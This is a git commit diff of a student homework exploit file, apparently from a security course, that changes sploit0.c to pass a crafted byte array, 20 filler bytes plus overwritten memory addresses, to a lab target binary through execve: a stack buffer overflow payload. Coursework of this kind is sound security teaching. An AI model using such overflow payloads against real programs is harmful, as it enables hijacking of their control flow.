cbbdd68c0f63b12950f654d109956b84a666049d
Shawn Zhong <github@shawnzhong.com>
2020-04-08 00:00:35 -0500

    Update sploit0.c

--- HW4/sploits/sploit0.c
+++ HW4/sploits/sploit0.c
@@ -5,12 +5,15 @@
 
 #define TARGET "/tmp/target0"
 
-int main(void)
-{
+int main(void) {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char arg[] = {[0 ... 19] = 49, 72, 248, 255, 191, 21, 133, 4, 8};
+
+  args[0] = TARGET;
+  args[1] = arg;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
